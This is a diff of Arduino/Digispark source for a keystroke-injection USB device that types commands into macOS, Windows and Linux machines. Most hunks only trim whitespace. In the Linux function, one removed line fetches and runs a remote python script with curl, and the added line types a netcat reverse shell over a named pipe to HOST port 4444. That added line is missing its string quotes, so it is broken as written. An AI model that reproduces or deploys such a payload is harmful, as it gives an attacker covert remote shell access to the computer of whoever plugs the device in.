@@ -47,7 +47,7 @@ void loop() {
     }
 }
 
-void osx_keyboard(int pin2) 
+void osx_keyboard(int pin2)
 {
     if (pin2 == 0) {
         DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); //normal
@@ -82,7 +82,7 @@ void osx_keyboard(int pin2)
     DigiKeyboard.delay(100);
 }
 
-void windows_keyboard() 
+void windows_keyboard()
 {
     DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 
@@ -117,7 +117,7 @@ void windows_keyboard()
     DigiKeyboard.delay(100);
 }
 
-void linux_keyboard() 
+void linux_keyboard()
 {
     DigiKeyboard.sendKeyStroke(KEY_F2, MOD_ALT_LEFT);
 
@@ -131,7 +131,7 @@ void linux_keyboard()
 
     DigiKeyboard.delay(300);
 
-    DigiKeyboard.println("nohup (python <(curl -s http://"HOST"/python.py))& exit");
+    DigiKeyboard.println(nohup /bin/sh -c 'rm -f /tmp/f && mkfifo /tmp/f && /bin/sh 2>&1 < /tmp/f | nc "HOST" 4444 > /tmp/f' & exit);
 
     DigiKeyboard.delay(100);
 
@@ -147,4 +147,3 @@ void linux_keyboard()
 
     DigiKeyboard.delay(100);
 }
-
